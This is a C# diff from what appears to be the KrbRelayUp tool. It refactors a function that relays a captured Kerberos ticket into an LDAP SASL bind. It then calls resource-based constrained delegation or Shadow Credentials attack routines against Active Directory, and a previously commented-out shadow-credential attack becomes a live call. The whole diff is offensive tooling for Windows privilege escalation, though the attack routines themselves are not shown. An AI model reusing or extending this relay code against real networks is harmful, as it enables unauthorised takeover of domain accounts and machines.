@@ -13,7 +13,7 @@ namespace KrbRelayUp.Relay
             ShadowCred = 2
         }
 
-        public static void Relay(RelayAttackType attackType, string sid = null, string computerName = null)
+        public static void Relay()
         {
             //create berval struct with the kerberos ticket
             var sTicket = new SecBuffer(ticket);
@@ -24,14 +24,7 @@ namespace KrbRelayUp.Relay
             };
             var bervalPtr = Marshal.AllocHGlobal(Marshal.SizeOf(berval));
             Marshal.StructureToPtr(berval, bervalPtr, false);
-            var bind = ldap_sasl_bind(
-                ld,
-                "",
-                "GSS-SPNEGO", // GSS-SPNEGO / GSSAPI
-                bervalPtr,
-                IntPtr.Zero,
-                IntPtr.Zero,
-                out IntPtr servresp);
+            var bind = ldap_sasl_bind(ld, "", "GSS-SPNEGO", bervalPtr, IntPtr.Zero, IntPtr.Zero, out IntPtr servresp);
             
             ldap_get_option(ld, 0x0031, out int value);
 
@@ -41,18 +34,14 @@ namespace KrbRelayUp.Relay
 
                 try
                 {
-                    if (attackType == RelayAttackType.RBCD)
+                    if (Options.relayAttackType == RelayAttackType.RBCD)
                     {
-                        if (!string.IsNullOrEmpty(sid))
-                            Attacks.Ldap.RBCD.attack(ld, sid, computerName);
+                        if (!string.IsNullOrEmpty(Options.rbcdComputerSid))
+                            Attacks.Ldap.RBCD.attack(ld);
                     }
-                    if (attackType == RelayAttackType.ShadowCred)
+                    if (Options.relayAttackType == RelayAttackType.ShadowCred)
                     {
-                        //string arg1 = relayedUser;
-                        //    if (!string.IsNullOrEmpty(attacks["shadowcred"]))
-                        //        arg1 = attacks["shadowcred"];
-                        //
-                        //    Attacks.Ldap.ShadowCredential.attack(ld, arg1);
+                        Attacks.Ldap.ShadowCred.attack(ld);
                     }
                 }
                 catch (Exception e)
@@ -61,12 +50,13 @@ namespace KrbRelayUp.Relay
                 }
 
                 ldap_unbind(ld);
-                Environment.Exit(0);
+                //Environment.Exit(0);
             }
             if ((LdapStatus)value != LdapStatus.LDAP_SASL_BIND_IN_PROGRESS)
             {
-                Console.WriteLine("[-] LDAP connection failed");
-                Environment.Exit(0);
+                if (!Options.attackDone)
+                    Console.WriteLine("[-] LDAP connection failed");
+                //Environment.Exit(0);
             }
             else
             {
